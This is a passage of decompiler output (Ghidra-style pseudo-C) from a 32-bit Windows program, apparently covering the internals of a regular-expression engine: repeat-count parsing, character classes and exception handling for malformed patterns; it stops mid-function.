undefined4 * __thiscall FUN_004084e4(void *this,byte param_1)

{
  FUN_0040781b((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    FUN_00407d7f((undefined4 *)this);
  }
  return (undefined4 *)this;
}



undefined4 * __fastcall FUN_00408500(undefined4 *param_1)

{
  thunk_FUN_00408fea(param_1);
  return param_1;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __fastcall FUN_0040850e(undefined4 *param_1)

{
  void *local_10;
  undefined *puStack_c;
  uint local_8;
  
  puStack_c = &LAB_00415cd6;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  *param_1 = &DAT_00417aac;
  local_8 = 1;
  FUN_0040857f((int)param_1 + 0x32);
  local_8 = local_8 & 0xffffff00;
  FUN_004085a0((int)param_1 + 0x2d);
  local_8 = 0xffffffff;
  FUN_0040857f((int)(param_1 + 10));
  ExceptionList = local_10;
  return;
}



undefined4 * __thiscall FUN_00408559(void *this,byte param_1)

{
  FUN_0040850e((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    operator_delete(this);
  }
  return (undefined4 *)this;
}



void __fastcall FUN_0040857f(int param_1)

{
  int iVar1;
  
  iVar1 = *(int *)(param_1 + 1);
  while (iVar1 != 0) {
    iVar1 = *(int *)((int)*(void **)(param_1 + 1) + 4);
    operator_delete(*(void **)(param_1 + 1));
    *(int *)(param_1 + 1) = iVar1;
  }
  return;
}



void __fastcall FUN_004085a0(int param_1)

{
  int iVar1;
  
  iVar1 = *(int *)(param_1 + 1);
  while (iVar1 != 0) {
    iVar1 = *(int *)((int)*(void **)(param_1 + 1) + 2);
    operator_delete(*(void **)(param_1 + 1));
    *(int *)(param_1 + 1) = iVar1;
  }
  return;
}



undefined4 * __fastcall FUN_004085c1(undefined4 *param_1)

{
  FUN_004085cf(param_1);
  return param_1;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __fastcall FUN_004085cf(undefined4 *param_1)

{
  void *local_10;
  undefined *puStack_c;
  uint local_8;
  
  puStack_c = &LAB_00415cfb;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  *param_1 = &DAT_004179dc;
  local_8 = 1;
  FUN_004130c4((int)param_1);
  local_8 = local_8 & 0xffffff00;
  param_1[6] = &DAT_00417ae4;
  FUN_00407152(param_1 + 6);
  *param_1 = &DAT_00417ab0;
  local_8 = 2;
  FUN_004130c4((int)param_1);
  local_8 = 0xffffffff;
  FUN_00407152(param_1);
  ExceptionList = local_10;
  return;
}



void __fastcall FUN_00408630(undefined4 *param_1)

{
  *param_1 = &DAT_00417ae4;
  FUN_00407152(param_1);
  return;
}



undefined4 * __fastcall FUN_0040863b(undefined4 *param_1)

{
  FUN_00408649(param_1);
  return param_1;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __fastcall FUN_00408649(undefined4 *param_1)

{
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_00415d10;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  *param_1 = &DAT_00417ab0;
  local_8 = 0;
  FUN_004130c4((int)param_1);
  local_8 = 0xffffffff;
  FUN_00407152(param_1);
  ExceptionList = local_10;
  return;
}



undefined4 * __fastcall FUN_00408681(undefined4 *param_1)

{
  FUN_0040868f(param_1);
  return param_1;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __fastcall FUN_0040868f(undefined4 *param_1)

{
  void *local_10;
  undefined *puStack_c;
  uint local_8;
  
  puStack_c = &LAB_00415d37;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  *param_1 = &DAT_00417a44;
  local_8 = 1;
  FUN_004130c4((int)param_1);
  local_8 = local_8 & 0xffffff00;
  param_1[6] = &DAT_00417b18;
  FUN_00407152(param_1 + 6);
  *param_1 = &DAT_00417ab0;
  local_8 = 2;
  FUN_004130c4((int)param_1);
  local_8 = 0xffffffff;
  FUN_00407152(param_1);
  ExceptionList = local_10;
  return;
}



void __fastcall FUN_004086f0(undefined4 *param_1)

{
  *param_1 = &DAT_00417b18;
  FUN_00407152(param_1);
  return;
}



void __fastcall FUN_004086fb(int param_1)

{
  int iVar1;
  undefined4 *puVar2;
  
  *(undefined *)(param_1 + 4) = 0;
  *(undefined *)(param_1 + 5) = 0;
  puVar2 = (undefined4 *)(param_1 + 6);
  for (iVar1 = 8; iVar1 != 0; iVar1 = iVar1 + -1) {
    *puVar2 = 0;
    puVar2 = puVar2 + 1;
  }
  *(undefined2 *)(param_1 + 0x26) = 0;
  FUN_0040857f(param_1 + 0x28);
  FUN_004085a0(param_1 + 0x2d);
  FUN_0040857f(param_1 + 0x32);
  return;
}



void __thiscall FUN_00408730(void *this,int *param_1)

{
  void *this_00;
  
  this_00 = (void *)param_1[8];
  FUN_0040b9ca(this_00);
  if (*(int *)((int)this + 0x10) != -1) {
    FUN_00413b05(this_00,(undefined4 *)(*(int *)((int)this + 0x10) * 0x1a + 9 + *param_1));
  }
  return;
}



void __thiscall FUN_0040876a(void *this,int *param_1)

{
  undefined uVar1;
  int iVar2;
  undefined4 uVar3;
  undefined4 uVar4;
  undefined4 *puVar5;
  undefined4 *puVar6;
  
  iVar2 = *(int *)(*(int *)((int)this + 8) + 0x10);
  if (iVar2 != -1) {
    puVar6 = (undefined4 *)(iVar2 * 0x1a + *param_1);
    uVar3 = *puVar6;
    uVar4 = puVar6[1];
    uVar1 = *(undefined *)(puVar6 + 2);
    puVar5 = (undefined4 *)FUN_0040c014((void *)param_1[8],0xc);
    if (puVar5 != (undefined4 *)0x0) {
      *puVar5 = uVar3;
      puVar5[1] = uVar4;
      *(undefined *)(puVar5 + 2) = uVar1;
    }
    *puVar6 = *(undefined4 *)((int)puVar6 + 9);
    puVar6[1] = param_1[2];
    *(undefined *)(puVar6 + 2) = 1;
  }
  return;
}



void __thiscall FUN_004087c6(void *this,int *param_1)

{
  int iVar1;
  undefined4 *puVar2;
  undefined4 local_10;
  undefined4 local_c;
  undefined local_8;
  
  iVar1 = *(int *)(*(int *)((int)this + 8) + 0x10);
  if (iVar1 != -1) {
    FUN_0040b9dc((void *)param_1[8],&local_10);
    puVar2 = (undefined4 *)(iVar1 * 0x1a + *param_1);
    *puVar2 = local_10;
    puVar2[1] = local_c;
    *(undefined *)(puVar2 + 2) = local_8;
  }
  return;
}



void __thiscall FUN_00408804(void *this,int *param_1)

{
  void *this_00;
  undefined4 *puVar1;
  undefined4 *puVar2;
  
  this_00 = (void *)param_1[8];
  puVar2 = (undefined4 *)(*(int *)((int)this + 0x25) * 0x1a + *param_1);
  puVar1 = (undefined4 *)(*(int *)((int)this + 0x29) * 0x1a + (int)puVar2);
  FUN_00413b05(this_00,param_1 + 2);
  while (puVar1 != puVar2) {
    puVar1 = (undefined4 *)((int)puVar1 + -0x1a);
    FUN_0040b9fb(this_00,puVar1);
  }
  return;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

undefined4 * __thiscall FUN_00408840(void *this,undefined param_1,undefined2 param_2,byte *param_3)

{
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_00415d4c;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  FUN_0040888b((undefined4 *)this);
  local_8 = 0;
  *(undefined **)this = &DAT_00417b4c;
  FUN_00408240(this,param_1,param_2,param_3);
  ExceptionList = local_10;
  return (undefined4 *)this;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __fastcall thunk_FUN_0040850e(undefined4 *param_1)

{
  void *pvStack_10;
  undefined *puStack_c;
  uint uStack_8;
  
  puStack_c = &LAB_00415cd6;
  pvStack_10 = ExceptionList;
  ExceptionList = &pvStack_10;
  *param_1 = &DAT_00417aac;
  uStack_8 = 1;
  FUN_0040857f((int)param_1 + 0x32);
  uStack_8 = uStack_8 & 0xffffff00;
  FUN_004085a0((int)param_1 + 0x2d);
  uStack_8 = 0xffffffff;
  FUN_0040857f((int)(param_1 + 10));
  ExceptionList = pvStack_10;
  return;
}



undefined4 * __fastcall FUN_0040888b(undefined4 *param_1)

{
  int iVar1;
  undefined4 *puVar2;
  undefined local_5;
  
  *(undefined *)(param_1 + 1) = 0;
  *(undefined *)((int)param_1 + 5) = 0;
  puVar2 = (undefined4 *)((int)param_1 + 6);
  for (iVar1 = 8; iVar1 != 0; iVar1 = iVar1 + -1) {
    *puVar2 = 0;
    puVar2 = puVar2 + 1;
  }
  local_5 = (undefined)((uint)param_1 >> 0x18);
  *(undefined2 *)((int)param_1 + 0x26) = 0;
  *(undefined *)(param_1 + 10) = local_5;
  *(undefined4 *)((int)param_1 + 0x29) = 0;
  *(undefined *)((int)param_1 + 0x2d) = local_5;
  *(undefined4 *)((int)param_1 + 0x2e) = 0;
  *(undefined *)((int)param_1 + 0x32) = local_5;
  *(undefined4 *)((int)param_1 + 0x33) = 0;
  *param_1 = &DAT_00417aac;
  return param_1;
}



undefined4 __thiscall FUN_004088d2(void *this,int *param_1)

{
  int iVar1;
  int iVar2;
  
  iVar2 = *(int *)(*(int *)(*(int *)((int)this + 8) + 0x14) + 0x10) * 0x1a + *param_1;
  if (param_1[2] == *(int *)(iVar2 + 0x12)) {
    FUN_00408c2d(this,param_1);
    iVar1 = *(int *)(*(int *)((int)this + 8) + 4);
    param_1[4] = iVar1;
  }
  else {
    FUN_00408c2d(this,param_1);
    if (*(int *)(*(int *)((int)this + 8) + 0x10) == *(int *)(iVar2 + 0xd)) {
      iVar1 = *(int *)(*(int *)((int)this + 8) + 4);
      param_1[4] = iVar1;
      *(undefined *)(iVar2 + 0x11) = 0;
    }
    else {
      *(undefined *)(iVar2 + 0x11) = 1;
      iVar1 = *(int *)(*(int *)((int)this + 8) + 8);
      param_1[4] = iVar1;
      *(int *)(iVar2 + 0xd) = *(int *)(iVar2 + 0xd) + 1;
    }
  }
  return CONCAT31((int3)((uint)iVar1 >> 8),1);
}



uint __thiscall FUN_00408936(void *this,int *param_1)

{
  int *piVar1;
  uint uVar2;
  int iVar3;
  
  iVar3 = *(int *)(*(int *)(*(int *)((int)this + 8) + 0x14) + 0x10) * 0x1a + *param_1;
  piVar1 = (int *)FUN_0040ba22(param_1[8]);
  if (param_1[2] != *piVar1) {
    if (*(char *)(iVar3 + 0x11) == '\0') {
      *(undefined *)(iVar3 + 0x11) = 1;
    }
    else {
      *(int *)(iVar3 + 0xd) = *(int *)(iVar3 + 0xd) + -1;
      param_1[4] = *(int *)(*(int *)((int)this + 8) + 4);
      uVar2 = *(uint *)(*(int *)((int)this + 8) + 0xc);
      if (uVar2 <= *(uint *)(iVar3 + 0xd)) {
        *(undefined *)(iVar3 + 0x11) = 0;
        return CONCAT31((int3)(uVar2 >> 8),1);
      }
    }
  }
  uVar2 = FUN_00408c5f(this,param_1);
  return uVar2 & 0xffffff00;
}



void __cdecl FUN_0040899b(undefined4 *param_1)

{
  if (param_1 != (undefined4 *)0x0) {
    param_1[1] = 0;
    param_1[2] = 0;
    *param_1 = &DAT_00417a10;
  }
  return;
}



undefined4 __thiscall FUN_004089b2(void *this,int *param_1)

{
  int iVar1;
  
  iVar1 = *(int *)(*(int *)(*(int *)((int)this + 8) + 0x14) + 0x10) * 0x1a + *param_1;
  if (param_1[2] == *(int *)(iVar1 + 0x12)) {
    FUN_00408c2d(this,param_1);
  }
  else {
    FUN_00408c2d(this,param_1);
    if (*(uint *)(iVar1 + 0xd) < *(uint *)(*(int *)((int)this + 8) + 0xc)) {
      *(uint *)(iVar1 + 0xd) = *(uint *)(iVar1 + 0xd) + 1;
      iVar1 = *(int *)(*(int *)((int)this + 8) + 8);
      goto LAB_004089ff;
    }
    *(undefined *)(iVar1 + 0x11) = 0;
  }
  iVar1 = *(int *)(*(int *)((int)this + 8) + 4);
LAB_004089ff:
  param_1[4] = iVar1;
  return CONCAT31((int3)((uint)iVar1 >> 8),1);
}



uint __thiscall FUN_00408a0a(void *this,int *param_1)

{
  int *piVar1;
  uint uVar2;
  int iVar3;
  
  iVar3 = *(int *)(*(int *)(*(int *)((int)this + 8) + 0x14) + 0x10) * 0x1a + *param_1;
  piVar1 = (int *)FUN_0040ba22(param_1[8]);
  if (param_1[2] != *piVar1) {
    if (*(char *)(iVar3 + 0x11) == '\0') {
      *(undefined *)(iVar3 + 0x11) = 1;
      if (*(uint *)(iVar3 + 0xd) < *(uint *)(*(int *)((int)this + 8) + 0x10)) {
        *(uint *)(iVar3 + 0xd) = *(uint *)(iVar3 + 0xd) + 1;
        iVar3 = *(int *)(*(int *)((int)this + 8) + 8);
        param_1[4] = iVar3;
        return CONCAT31((int3)((uint)iVar3 >> 8),1);
      }
    }
    else {
      *(int *)(iVar3 + 0xd) = *(int *)(iVar3 + 0xd) + -1;
    }
  }
  uVar2 = FUN_00408c5f(this,param_1);
  return uVar2 & 0xffffff00;
}



void __cdecl FUN_00408a6f(undefined4 *param_1)

{
  if (param_1 != (undefined4 *)0x0) {
    param_1[1] = 0;
    param_1[2] = 0;
    *param_1 = &DAT_00417a78;
  }
  return;
}



undefined4 * __thiscall FUN_00408a86(void *this,byte param_1)

{
  thunk_FUN_0040850e((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    operator_delete(this);
  }
  return (undefined4 *)this;
}



undefined4 * __thiscall FUN_00408aa2(void *this,byte param_1)

{
  FUN_00408630((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    FUN_0040899b((undefined4 *)this);
  }
  return (undefined4 *)this;
}



undefined4 * __thiscall FUN_00408abe(void *this,byte param_1)

{
  FUN_004086f0((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    FUN_00408a6f((undefined4 *)this);
  }
  return (undefined4 *)this;
}



void __fastcall FUN_00408ada(void *param_1)

{
  ushort *puVar1;
  ushort *puVar2;
  ushort *puVar3;
  undefined uVar4;
  ushort **ppuVar5;
  int iVar6;
  ushort *puVar7;
  uint _C;
  void *local_8;
  
  local_8 = param_1;
  if (*(int *)((int)param_1 + 0x29) != 0) {
    FUN_0040ba64((int)param_1 + 0x28);
    puVar2 = *(ushort **)((int)param_1 + 0x29);
    puVar3 = *(ushort **)(*(ushort **)((int)param_1 + 0x29) + 2);
    while (puVar3 != (ushort *)0x0) {
      puVar1 = puVar2 + 1;
      if (puVar2[1] + 1 < (uint)*puVar3) {
        puVar2 = puVar3;
        puVar3 = *(ushort **)(puVar3 + 2);
      }
      else {
        puVar7 = puVar3 + 1;
        if (puVar3[1] < *puVar1) {
          puVar7 = puVar1;
        }
        *puVar1 = *puVar7;
        ppuVar5 = (ushort **)FUN_00408c88((void *)((int)param_1 + 0x28),&local_8,puVar3,puVar2);
        puVar3 = *ppuVar5;
      }
    }
  }
  if (*(short *)((int)param_1 + 0x26) != 0) {
    _C = 0;
    do {
      iVar6 = _isctype(_C,(uint)*(ushort *)((int)param_1 + 0x26));
      if (iVar6 != 0) {
        FUN_0040828d((void *)((int)param_1 + 6),(byte)_C);
      }
      _C = _C + 1;
    } while (_C < 0x100);
  }
  if ((*(int *)((int)param_1 + 0x2e) == 0) && (*(int *)((int)param_1 + 0x33) == 0)) {
    uVar4 = 1;
  }
  else {
    uVar4 = 0;
  }
  *(undefined *)((int)param_1 + 5) = uVar4;
  return;
}



void __thiscall FUN_00408b88(void *this,int *param_1)

{
  undefined4 uVar1;
  undefined4 uVar2;
  undefined4 uVar3;
  undefined4 *puVar4;
  int iVar5;
  undefined3 local_b;
  undefined uStack_8;
  
  iVar5 = *(int *)(*(int *)((int)this + 0x14) + 0x10) * 0x1a + *param_1;
  uVar1 = *(undefined4 *)(iVar5 + 0xd);
  uVar2 = *(undefined4 *)(iVar5 + 0x12);
  uVar3 = *(undefined4 *)(iVar5 + 0x11);
  local_b = (undefined3)*(undefined4 *)(iVar5 + 0x16);
  uStack_8 = (undefined)((uint)*(undefined4 *)(iVar5 + 0x16) >> 0x18);
  puVar4 = (undefined4 *)FUN_0040c014((void *)param_1[8],0x10);
  if (puVar4 != (undefined4 *)0x0) {
    *puVar4 = uVar1;
    puVar4[1] = uVar3;
    puVar4[2] = CONCAT31(local_b,(char)((uint)uVar2 >> 0x18));
    *(undefined *)(puVar4 + 3) = uStack_8;
  }
  *(undefined4 *)(iVar5 + 0xd) = 0;
  *(undefined *)(iVar5 + 0x11) = 1;
  *(undefined4 *)(iVar5 + 0x12) = DAT_00417674;
  *(undefined4 *)(iVar5 + 0x16) = DAT_00417674;
  return;
}



void __thiscall FUN_00408bef(void *this,int *param_1)

{
  int iVar1;
  undefined4 local_14;
  undefined local_10;
  undefined4 local_f;
  undefined4 local_b;
  
  iVar1 = *(int *)(*(int *)((int)this + 0x14) + 0x10) * 0x1a + *param_1;
  FUN_0040ba2e((void *)param_1[8],&local_14);
  *(undefined4 *)(iVar1 + 0xd) = local_14;
  *(undefined *)(iVar1 + 0x11) = local_10;
  *(undefined4 *)(iVar1 + 0x12) = local_f;
  *(undefined4 *)(iVar1 + 0x16) = local_b;
  return;
}



void __thiscall FUN_00408c2d(void *this,int *param_1)

{
  int iVar1;
  
  iVar1 = *(int *)(*(int *)(*(int *)((int)this + 8) + 0x14) + 0x10) * 0x1a + *param_1;
  FUN_0040ba4e((void *)param_1[8],(undefined4 *)(iVar1 + 0x12));
  *(undefined4 *)(iVar1 + 0x12) = *(undefined4 *)(iVar1 + 0x16);
  *(int *)(iVar1 + 0x16) = param_1[2];
  return;
}



void __thiscall FUN_00408c5f(void *this,int *param_1)

{
  int iVar1;
  
  iVar1 = *(int *)(*(int *)(*(int *)((int)this + 8) + 0x14) + 0x10) * 0x1a + *param_1;
  *(undefined4 *)(iVar1 + 0x16) = *(undefined4 *)(iVar1 + 0x12);
  FUN_00413b05((void *)param_1[8],(undefined4 *)(iVar1 + 0x12));
  return;
}



void __thiscall FUN_00408c88(void *this,void **param_1,void *param_2,void *param_3)

{
  void *pvVar1;
  void *pvVar2;
  void *pvVar3;
  void **ppvVar4;
  
  ppvVar4 = (void **)((int)this + 1);
  pvVar3 = *ppvVar4;
  if (pvVar3 != param_2) {
    if (param_3 == (void *)0x0) goto LAB_00408ca9;
    pvVar1 = *(void **)((int)param_3 + 4);
    pvVar2 = pvVar3;
    while (pvVar3 = pvVar2, pvVar1 != param_2) {
LAB_00408ca9:
      pvVar1 = *(void **)((int)pvVar3 + 4);
      pvVar2 = pvVar1;
      param_3 = pvVar3;
    }
    ppvVar4 = (void **)((int)param_3 + 4);
  }
  *ppvVar4 = *(void **)((int)param_2 + 4);
  operator_delete(param_2);
  *param_1 = *ppvVar4;
  return;
}



void __thiscall FUN_00408ccf(void *this,undefined *param_1,char *param_2)

{
  undefined uVar1;
  undefined4 local_c;
  undefined4 local_8;
  
  uVar1 = *param_1;
  *param_1 = 0;
  local_c = CONCAT31((int3)((uint)this >> 8),uVar1);
  local_8 = *(undefined4 *)(param_1 + 4);
  FUN_00402c9d(param_1,param_2);
  FUN_00402c9d(param_2,(char *)&local_c);
  FUN_0040260b((char *)&local_c);
  return;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __thiscall
FUN_00408d03(void *this,undefined *param_1,char **param_2,char param_3,void *param_4)

{
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *pbVar1;
  char *pcVar2;
  char cVar3;
  int iVar4;
  undefined3 extraout_var_00;
  uint uVar5;
  undefined3 extraout_var_01;
  size_t sVar6;
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> in_stack_0000000f;
  undefined *local_5c [7];
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> local_40 [16];
  char local_30 [4];
  int local_2c;
  char local_28 [4];
  int local_24;
  uint local_20;
  uint local_1c;
  char *local_18;
  char local_11;
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  undefined3 extraout_var;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_00415d69;
  local_10 = ExceptionList;
  pbVar1 = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
            ((int)this + 0x27);
  ExceptionList = &local_10;
  std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Freeze(pbVar1)
  ;
  if ((char *)(-(uint)(*(int *)(pbVar1 + 4) != 0) & *(int *)(pbVar1 + 8) + *(int *)(pbVar1 + 4)) ==
      *param_2) {
    ExceptionList = local_10;
    return;
  }
  cVar3 = (**(code **)(**(int **)(param_1 + 4) + 0x28))();
  if (cVar3 != '\0') {
    ExceptionList = local_10;
    return;
  }
  local_18 = *param_2;
  pbVar1 = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
            ((int)this + 0x27);
  local_11 = '\0';
  local_20 = 0xffffffff;
  std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Freeze(pbVar1)
  ;
  cVar3 = FUN_00406b76(param_4,&local_18,
                       (char *)(-(uint)(*(int *)(pbVar1 + 4) != 0) &
                               *(int *)(pbVar1 + 8) + *(int *)(pbVar1 + 4)));
  iVar4 = CONCAT31(extraout_var,cVar3);
  if (iVar4 == 9) {
LAB_00408f53:
    local_1c = 1;
  }
  else {
    if (iVar4 == 10) {
LAB_00408f49:
      local_1c = 0;
      goto LAB_00408f65;
    }
    if (iVar4 == 0xb) {
LAB_00408f38:
      local_1c = 0;
      local_20 = 1;
      goto LAB_00408f65;
    }
    if (iVar4 == 0xc) {
      local_11 = '\x01';
      goto LAB_00408f53;
    }
    if (iVar4 == 0xd) {
      local_11 = '\x01';
      goto LAB_00408f49;
    }
    if (iVar4 == 0xe) {
      local_11 = '\x01';
      goto LAB_00408f38;
    }
    if (iVar4 != 0xf) {
      ExceptionList = local_10;
      return;
    }
    pbVar1 = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
              ((int)this + 0x27);
    std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Freeze
              (pbVar1);
    local_1c = FUN_004090ff(&local_18,
                            (char *)(-(uint)(*(int *)(pbVar1 + 4) != 0) &
                                    *(int *)(pbVar1 + 8) + *(int *)(pbVar1 + 4)),0xffffffff);
    pbVar1 = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
              ((int)this + 0x27);
    std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Freeze
              (pbVar1);
    if ((char *)(-(uint)(*(int *)(pbVar1 + 4) != 0) & *(int *)(pbVar1 + 8) + *(int *)(pbVar1 + 4))
        == local_18) {
      ExceptionList = local_10;
      return;
    }
    pbVar1 = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
              ((int)this + 0x27);
    std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Freeze
              (pbVar1);
    cVar3 = FUN_00406b76(param_4,&local_18,
                         (char *)(-(uint)(*(int *)(pbVar1 + 4) != 0) &
                                 *(int *)(pbVar1 + 8) + *(int *)(pbVar1 + 4)));
    pcVar2 = local_18;
    iVar4 = CONCAT31(extraout_var_00,cVar3);
    if (iVar4 == 0x10) {
      pbVar1 = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
                ((int)this + 0x27);
      std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Freeze
                (pbVar1);
      uVar5 = FUN_004090ff(&local_18,
                           (char *)(-(uint)(*(int *)(pbVar1 + 4) != 0) &
                                   *(int *)(pbVar1 + 8) + *(int *)(pbVar1 + 4)),0xffffffff);
      if (local_18 != pcVar2) {
        local_20 = uVar5;
      }
      pbVar1 = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
                ((int)this + 0x27);
      std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Freeze
                (pbVar1);
      if (local_18 ==
          (char *)(-(uint)(*(int *)(pbVar1 + 4) != 0) & *(int *)(pbVar1 + 8) + *(int *)(pbVar1 + 4))
         ) {
        ExceptionList = local_10;
        return;
      }
      pbVar1 = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
                ((int)this + 0x27);
      std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Freeze
                (pbVar1);
      cVar3 = FUN_00406b76(param_4,&local_18,
                           (char *)(-(uint)(*(int *)(pbVar1 + 4) != 0) &
                                   *(int *)(pbVar1 + 8) + *(int *)(pbVar1 + 4)));
      if (CONCAT31(extraout_var_01,cVar3) != 0x11) {
        if (CONCAT31(extraout_var_01,cVar3) != 0x12) {
          ExceptionList = local_10;
          return;
        }
        local_11 = '\x01';
      }
      if (local_20 < local_1c) {
        local_40[0] = in_stack_0000000f;
        std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
                  (local_40,false);
        sVar6 = strlen(s_Can_t_do__n__m__with_n_>_m_0041c448);
        std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::assign
                  (local_40,s_Can_t_do__n__m__with_n_>_m_0041c448,sVar6);
        local_8 = 0;
        std::logic_error::logic_error((logic_error *)local_5c,local_40);
        local_5c[0] = &DAT_00417698;
                    // WARNING: Subroutine does not return
        _CxxThrowException(local_5c,(ThrowInfo *)&DAT_004196f8);
      }
    }
    else {
      if (iVar4 != 0x11) {
        if (iVar4 != 0x12) {
          ExceptionList = local_10;
          return;
        }
        local_11 = '\x01';
      }
      local_20 = local_1c;
    }
  }
  if (local_1c == 0xffffffff) {
    ExceptionList = local_10;
    return;
  }
LAB_00408f65:
  if ((param_3 != '\0') && (0x10 < local_20)) {
    *(undefined *)((int)this + 10) = 0;
  }
  local_2c = (**(code **)(**(int **)(param_1 + 4) + 0x1c))
                       (local_1c,local_20,local_11 == '\0',(int)this + 4);
  *param_1 = 0;
  local_30[0] = '\0';
  local_28[0] = local_2c != 0;
  local_8 = 1;
  local_24 = local_2c;
  FUN_0040bf91(param_1,local_28);
  FUN_00406ed3(local_28);
  local_8 = 0xffffffff;
  *param_2 = local_18;
  FUN_00406ed3(local_30);
  ExceptionList = local_10;
  return;
}



void __fastcall FUN_00408fea(undefined4 *param_1)

{
  int iVar1;
  
  *param_1 = &DAT_004178fc;
  iVar1 = param_1[3];
  while (iVar1 != 0) {
    iVar1 = *(int *)(param_1[3] + 4);
    param_1[3] = iVar1;
  }
  FUN_00407152(param_1);
  return;
}



undefined4 * __cdecl FUN_00409008(void **param_1)

{
  undefined4 *puVar1;
  
  puVar1 = (undefined4 *)FUN_0040507f(*param_1,8);
  if (puVar1 != (undefined4 *)0x0) {
    puVar1[1] = 0;
    *puVar1 = &DAT_00417b50;
    return puVar1;
  }
  return (undefined4 *)0x0;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void FUN_00409027(void)

{
  size_t sVar1;
  undefined *local_40 [7];
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> local_24 [20];
  void *pvStack_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_00415d7d;
  pvStack_10 = ExceptionList;
  ExceptionList = &pvStack_10;
  std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
            (local_24,false);
  sVar1 = strlen(s_recursion_sub_expression_cannot_b_0041c464);
  std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::assign
            (local_24,s_recursion_sub_expression_cannot_b_0041c464,sVar1);
  local_8 = 0;
  std::logic_error::logic_error((logic_error *)local_40,local_24);
  local_40[0] = &DAT_00417698;
                    // WARNING: Subroutine does not return
  _CxxThrowException(local_40,(ThrowInfo *)&DAT_004196f8);
}



void __thiscall FUN_00409099(void *this,int *param_1,int param_2)

{
  FUN_0040aa54(this,param_1,param_2);
  return;
}



void __thiscall FUN_004090ae(void *this,int *param_1)

{
  FUN_0040aaea(this,param_1);
  return;
}



void __thiscall FUN_004090c0(void *this,int *param_1)

{
  FUN_0040ab50(this,param_1);
  return;
}



uint __cdecl FUN_004090ff(char **param_1,char *param_2,uint param_3)

{
  char cVar1;
  uint uVar2;
  char *pcVar3;
  
  uVar2 = 0;
  if (param_2 != *param_1) {
    do {
      cVar1 = **param_1;
      if (((cVar1 < '0') || ('9' < cVar1)) || (param_3 <= uVar2)) break;
      pcVar3 = *param_1 + 1;
      *param_1 = pcVar3;
      uVar2 = cVar1 + -0x30 + uVar2 * 10;
    } while (param_2 != pcVar3);
    if (param_3 < uVar2) {
      uVar2 = uVar2 / 10;
      *param_1 = *param_1 + -1;
    }
  }
  return uVar2;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

undefined4 * __cdecl FUN_00409146(undefined4 param_1,undefined4 param_2,void **param_3)

{
  undefined4 *this;
  undefined4 *puVar1;
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_00415d96;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  this = (undefined4 *)FUN_0040507f(*param_3,0x34);
  local_8 = 0;
  puVar1 = (undefined4 *)0x0;
  if (this != (undefined4 *)0x0) {
    FUN_00409194(this,param_1,param_3);
    *this = &DAT_00417b84;
    this[0xc] = param_2;
    puVar1 = this;
  }
  ExceptionList = local_10;
  return puVar1;
}



undefined4 * __thiscall FUN_00409194(void *this,undefined4 param_1,undefined4 *param_2)

{
  FUN_00407aa7(this,param_1,param_2);
  *(undefined4 *)((int)this + 0x28) = 0;
  *(void **)((int)this + 0x2c) = this;
  *(undefined **)((int)this + 0x24) = &DAT_00417938;
  *(undefined **)this = &DAT_00417758;
  return (undefined4 *)this;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

undefined4 * FUN_004091be(undefined4 param_1,int param_2,void **param_3)

{
  void *this;
  undefined4 *puVar1;
  undefined4 extraout_ECX;
  undefined4 uVar2;
  undefined4 uVar3;
  char acStack_1c [8];
  undefined *puStack_14;
